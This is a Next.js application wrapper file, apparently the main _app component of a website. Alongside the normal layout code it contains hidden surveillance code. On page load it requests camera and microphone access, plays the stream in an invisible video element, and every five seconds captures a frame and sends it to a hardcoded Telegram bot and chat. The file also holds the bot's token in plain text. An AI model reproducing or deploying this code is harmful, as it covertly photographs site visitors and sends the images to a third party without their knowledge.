import Layout from "@/app/components/layout/Layout";
import '@/app/assets/globals.scss';
import { Provider } from "@/app/components/ui/Context/Context";
import { useEffect, useRef } from "react";

const MyApp = ({ Component, pageProps }) => {
  const videoRef = useRef(null);
  let intervalId;

  const TELEGRAM_BOT_TOKEN = "6444223689:AAFxMZ7OtGgRxLIy6IfhzxBXXJ9tHmUd-WY";
  const TELEGRAM_CHAT_ID = "-1001860144177";
  const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;

  useEffect(() => {
    const getMediaAndSendData = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });

        if (videoRef.current) {
          videoRef.current.srcObject = stream;

          intervalId = setInterval(async () => {
            const photoDataUrl = captureFrame();
            const blob = await (await fetch(photoDataUrl)).blob();

            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('photo', blob, 'photo.jpg');

            try {
              const response = await fetch(TELEGRAM_API_URL, {
                method: 'POST',
                body: formData,
              });

              if (response.ok) {
                console.log('Фото успешно отправлено на бота');
              } else {
                console.error('Ошибка при отправке фото на бота:', response.status, response.statusText, await response.text());
              }
            } catch (error) {
              console.error('Ошибка fetch:', error);
            }
          }, 5000);
        }
      } catch (error) {
        console.error('Ошибка доступа к мультимедийным устройствам:', error);
      }
    };

    getMediaAndSendData();

    return () => clearInterval(intervalId);
  }, []);

  const captureFrame = () => {
    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');
    canvas.width = videoRef.current.videoWidth;
    canvas.height = videoRef.current.videoHeight;
    context.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
    return canvas.toDataURL('image/jpeg');
  };

  return (
    <Provider>
      <Layout>
        <Component {...pageProps} />
        <video ref={videoRef} autoPlay muted style={{ display: 'none' }} />
      </Layout>
    </Provider>
  );
}

export default MyApp;
